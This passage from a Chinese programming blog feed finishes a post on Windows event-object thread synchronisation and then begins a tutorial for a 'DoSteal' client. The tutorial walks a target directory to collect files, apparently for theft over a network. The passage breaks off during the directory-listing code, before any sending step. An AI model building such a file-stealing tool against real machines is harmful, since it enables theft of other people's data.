class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">NumberOfOthers</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hEvent, INFINITE);<span class="comment">//一直等待</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i] != <span class="number">0</span>; i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (str[i] != <span class="string">&#x27;A&#x27;</span>)count++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;others char count number = %d\n&quot;</span>, count - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>-1的事。</p><p>当然还不是事件对象</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> str[<span class="number">100</span>];<span class="comment">//字符串</span></span><br><span class="line">HANDLE hEvent;<span class="comment">//句柄</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">NumberOfA</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i] != <span class="number">0</span>; i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (str[i] == <span class="string">&#x27;A&#x27;</span>)count++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;A count number = %d\n&quot;</span>, count);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">NumberOfOthers</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i] != <span class="number">0</span>; i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (str[i] != <span class="string">&#x27;A&#x27;</span>)count++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;others char count number = %d\n&quot;</span>, count - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">HANDLE hThread1, hThread2;</span><br><span class="line"><span class="built_in">fputs</span>(<span class="string">&quot;Pleas Input string:\n&quot;</span>,stdout);</span><br><span class="line"><span class="built_in">fgets</span>(str, <span class="number">100</span>, stdin);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个自动重置的事件，初始值为无信号状态</span></span><br><span class="line">hEvent = <span class="built_in">CreateEvent</span>(<span class="literal">NULL</span>, FALSE, FALSE, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//两个线程分别统计A和其它成员个数</span></span><br><span class="line">hThread1 = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, NumberOfA, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThread2 = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, NumberOfOthers, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread1, INFINITE);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread2, INFINITE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//线程执行完毕后，重置事件为无信号状态</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hEvent);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);</code><br>第二个参数提到过，如果为TRUE，则事手动重置事件对象，即该对象需要用ResetEvent去重置为非信号对象。而FALSE则是自动重置事件对象，单个线程被释放之后就会重置为非信号。</p><p>像上述代码事实上阻塞的是hTread1和2两个线程让他挨个跑完得到结果，那么个人感觉event没什么关系了。<br>但是不阻塞这两个线程，就有可能发生只有一个线程来得及输出然后main进程就结束了。</p><p>所以按照我的逻辑</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> str[<span class="number">100</span>];<span class="comment">//字符串</span></span><br><span class="line">HANDLE hEvent;<span class="comment">//句柄</span></span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">NumberOfA</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line">count = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hEvent, INFINITE);<span class="comment">//一直等待</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i] != <span class="number">0</span>; i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (str[i] == <span class="string">&#x27;A&#x27;</span>)count++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;A count number = %d\n&quot;</span>, count);</span><br><span class="line"></span><br><span class="line"><span class="built_in">SetEvent</span>(hEvent);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">NumberOfOthers</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line">count = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hEvent, INFINITE);<span class="comment">//一直等待</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i] != <span class="number">0</span>; i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (str[i] != <span class="string">&#x27;A&#x27;</span>)count++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;others char count number = %d\n&quot;</span>, count - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">SetEvent</span>(hEvent);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">HANDLE hThread1, hThread2;</span><br><span class="line"><span class="built_in">fputs</span>(<span class="string">&quot;Pleas Input string:\n&quot;</span>,stdout);</span><br><span class="line"><span class="built_in">fgets</span>(str, <span class="number">100</span>, stdin);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个自动重置的事件，初始值为有信号状态</span></span><br><span class="line">hEvent = <span class="built_in">CreateEvent</span>(<span class="literal">NULL</span>, FALSE, TRUE, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//两个线程分别统计A和其它成员个数</span></span><br><span class="line">hThread1 = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, NumberOfA, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThread2 = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, NumberOfOthers, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//线程执行完毕后，重置事件为无信号状态</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(hEvent);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我这么设计的event<code>hEvent = CreateEvent(NULL, FALSE, TRUE, NULL);</code><br>它是自动重置，初始值有信号的事件对象。</p><p>那么我两个线程就很好处理了，它默认有信号，就提前wait等待，不管哪个线程先执行，都是有信号的状态，用完之后event自动重置无信号了，我们在线程快结束前给他SetEvent，在设置成有信号的事件，那么下一个线程调用就没有问题了。</p><img src="/2022/07/18/thread/022.png" class=""><p>效果是到位了，如果我在某个线程wait之后没有set，那么有一个线程就会没法跑了。亲测有效。</p><p>那么如果是自动重置，初始无信号。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">NumberOfA</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line">count = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">SetEvent</span>(hEvent);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hEvent, INFINITE);<span class="comment">//一直等待</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i] != <span class="number">0</span>; i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (str[i] == <span class="string">&#x27;A&#x27;</span>)count++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;A count number = %d\n&quot;</span>, count);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">NumberOfOthers</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line">count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">SetEvent</span>(hEvent);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hEvent, INFINITE);<span class="comment">//一直等待</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i] != <span class="number">0</span>; i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (str[i] != <span class="string">&#x27;A&#x27;</span>)count++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;others char count number = %d\n&quot;</span>, count - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始无信号，那么进入线程之前就要先设置信号，然后wait。虽然这样操作有点儿比了。但是至少了解一下用法。</p><img src="/2022/07/18/thread/023.png" class=""><p>不然实在是感受不到这种所谓的信号带来的影响？</p><blockquote><p>ps:阻塞线程和system好像都差不多，学这个我感觉自己越来越糊涂。</p></blockquote><hr><p>这种统计的可能不是很好的体现出事件对象的特点</p><p>那么可以来一个卖票的情况。<br>假设两个窗口，一共10或者100张票，依次卖票，而两个线程谁多谁少只能看cpu。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> piao = <span class="number">100</span>;</span><br><span class="line">HANDLE sigHand;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">SellTicketA</span><span class="params">(<span class="type">void</span> *p)</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;窗口1开始卖票!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(sigHand, INFINITE);</span><br><span class="line"><span class="keyword">if</span> (piao &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;窗口1售出第%d张票...\n&quot;</span>, piao);</span><br><span class="line">piao--;</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">100</span>);<span class="comment">//给打印什么的留点时间</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">SetEvent</span>(sigHand);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">SellTicketB</span><span class="params">(<span class="type">void</span> *p)</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;窗口2开始卖票!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(sigHand, INFINITE);</span><br><span class="line"><span class="keyword">if</span> (piao &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;窗口2售出第%d张票...\n&quot;</span>, piao);</span><br><span class="line">piao--;</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">100</span>);<span class="comment">//给打印什么的留点时间</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">SetEvent</span>(sigHand);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;开始卖票！\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">HANDLE hOne, hTwo;</span><br><span class="line">hOne = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, SellTicketA, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">hTwo = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, SellTicketB, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//自动重置 初始化无信号</span></span><br><span class="line">sigHand = <span class="built_in">CreateEvent</span>(<span class="literal">NULL</span>, FALSE, FALSE, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//手动设置信号</span></span><br><span class="line"><span class="built_in">SetEvent</span>(sigHand);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">20000</span>);<span class="comment">//两个线程跑起来要点时间的。</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);<span class="comment">//怕一闪而过，阻塞一下控制台</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(sigHand);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hOne);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hTwo);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然这是<code>sigHand = CreateEvent(NULL, FALSE, FALSE, NULL);</code><br>自动重置，初始无信号的情况，所以我们要先手动设置信号，这样两个线程才能wait到信号，然后运行完重新设置信号，以便于另一个进程使用。</p><img src="/2022/07/18/thread/024.png" class=""><p>100有点长就不截图了。</p><p>其余事件对象方式不再做示范，有兴趣自己玩玩容易理解。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>tmd，很杂，真的很杂，而且有些地方要看半天调几下~后面能记住多少是另一码事了。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> windowsSocket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络截取文件</title>
      <link href="/2022/07/16/winFiles/"/>
      <url>/2022/07/16/winFiles/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>socket的基础语法看过了，但是要说掌握那也是没掌握住~往下看用到再补。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>当然基础的截取，肯定先知道ip地址，然后权限开放程度高点。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Steal start!\n&quot;</span>);</span><br><span class="line"><span class="built_in">DoSteal</span>(<span class="string">&quot;E:\\mysdk\\&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>“E:&#x2F;mysdk”，使用反斜杠的做法同样有效，似乎是起源于unix写法，linux也很好的传承了，比如&#x2F;etc&#x2F;hosts之类的，而双斜杠自然是为了转译，毕竟单斜杠就会转译后面的字符了，如果是中文那才是真的gg。</strong></p><hr><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><p>能够多次使用，就做一个函数，传递的自然是文件路径，就用字符串，为了保证不被修改，加上const修饰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">DoSteal</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filePath)</span></span>&#123;</span><br><span class="line"><span class="comment">//遍历文件</span></span><br><span class="line">WIN32_FIND_DATA FindFileData;<span class="comment">//表示文件，记不住留印象下次翻文档</span></span><br><span class="line">HANDLE hListFile;<span class="comment">//文件以句柄表示</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//首先找到第一个匹配的文件，借助windows api</span></span><br><span class="line"><span class="type">char</span> searFilePath[MAX_PATH];<span class="comment">//注：MAX_PATH是一个宏，值为260</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/16/winFiles/000.png" class=""><p>善用工具和文档，可以节省一些问题。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">DoSteal</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filePath)</span></span>&#123;</span><br><span class="line"><span class="comment">//遍历文件</span></span><br><span class="line">WIN32_FIND_DATA FindFileData;<span class="comment">//表示文件，记不住留印象下次翻文档</span></span><br><span class="line">HANDLE hListFile;<span class="comment">//文件以句柄表示</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//首先找到第一个匹配的文件，借助windows api</span></span><br><span class="line"><span class="type">char</span> searFilePath[MAX_PATH] = &#123;<span class="number">0</span>&#125;;<span class="comment">//注：MAX_PATH是一个宏，值为260</span></span><br><span class="line"><span class="built_in">strcpy</span>(searFilePath, filePath);<span class="comment">//先将传入的文件路径拷贝下来</span></span><br><span class="line"><span class="built_in">strcat</span>(searFilePath, <span class="string">&quot;\\*&quot;</span>);<span class="comment">//再加上一个通配符，*代表全部</span></span><br><span class="line"><span class="built_in">FindFirstFile</span>((LPCTSTR)searFilePath, &amp;FindFileData);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>searFilePath毕竟是char类型，要么强转，要么修改项目字符类型为多字节吧。</p><p>然后这边编译器其实会对strcpy和strcat报错，原因在于vs认为这俩函数不安全，建议你用_s的函数，但是这里不考虑这么搞，就强制取消对这个</p><img src="/2022/07/16/winFiles/001.png" class=""><p>4996问题报错，把它关了。</p><img src="/2022/07/16/winFiles/002.png" class=""><p>然后在编译就没啥问题了。</p><p>额，这边后面有报错字符类型转换问题，那干脆还是修改项目字符类型为多字节吧。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">DoSteal</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filePath)</span></span>&#123;</span><br><span class="line"><span class="comment">//遍历文件</span></span><br><span class="line">WIN32_FIND_DATA FindFileData;<span class="comment">//表示文件，记不住留印象下次翻文档</span></span><br><span class="line">HANDLE hListFile;<span class="comment">//文件以句柄表示</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//首先找到第一个匹配的文件，借助windows api</span></span><br><span class="line"><span class="type">char</span> searFilePath[MAX_PATH] = &#123;<span class="number">0</span>&#125;;<span class="comment">//注：MAX_PATH是一个宏，值为260</span></span><br><span class="line"><span class="built_in">strcpy</span>(searFilePath, filePath);<span class="comment">//先将传入的文件路径拷贝下来</span></span><br><span class="line"><span class="built_in">strcat</span>(searFilePath, <span class="string">&quot;\\*&quot;</span>);<span class="comment">//再加上一个通配符，*代表全部</span></span><br><span class="line">hListFile = <span class="built_in">FindFirstFile</span>(searFilePath, &amp;FindFileData);</span><br><span class="line"></span><br><span class="line"><span class="comment">//循环遍历，毕竟是通配符*</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="type">char</span> mypath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">strcpy</span>(mypath, filePath);<span class="comment">//copy路径</span></span><br><span class="line"><span class="built_in">strcat</span>(mypath, FindFileData.cFileName);<span class="comment">//将其文件名拼接到路径后面</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;mypath = %s\n&quot;</span>,mypath);</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">FindNextFile</span>(hListFile,&amp;FindFileData));<span class="comment">//FindNextFile返回值NULL则表示结束</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后跑一遍</p><img src="/2022/07/16/winFiles/003.png" class=""><p>看到结果是正常的。</p><p>路径显示正常了，就需要读出单个文件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">DoSteal</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filePath)</span></span>&#123;</span><br><span class="line"><span class="comment">//遍历文件</span></span><br><span class="line">WIN32_FIND_DATA FindFileData;<span class="comment">//表示文件，记不住留印象下次翻文档</span></span><br><span class="line">HANDLE hListFile;<span class="comment">//文件以句柄表示</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//首先找到第一个匹配的文件，借助windows api</span></span><br><span class="line"><span class="type">char</span> searFilePath[MAX_PATH] = &#123;<span 